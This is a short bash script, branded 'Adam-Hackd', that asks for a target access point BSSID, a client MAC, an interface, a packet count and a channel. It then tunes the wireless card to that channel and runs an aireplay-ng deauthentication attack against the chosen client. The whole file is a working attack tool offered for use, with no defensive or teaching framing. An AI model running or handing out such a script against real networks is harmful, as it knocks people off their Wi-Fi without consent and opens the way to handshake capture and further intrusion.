#!/bin/bash

sleep 1
figlet Adam-Hackd

echo "welcom to my new tools...!"
read -p "Enter Bssid :# " bssid
read -p "Enter mac Target :# " t
read -p "Enter Intrface :# " i
read -p "Enter number of packet :# " pack
read -p "Enter number channel :# " c
sleep 1
sudo iwconfig $i channel $c
sleep 1
sudo xterm -e aireplay-ng -0 $pack -a $bssid -c $t $i
echo "Thanks for try my tools...!"
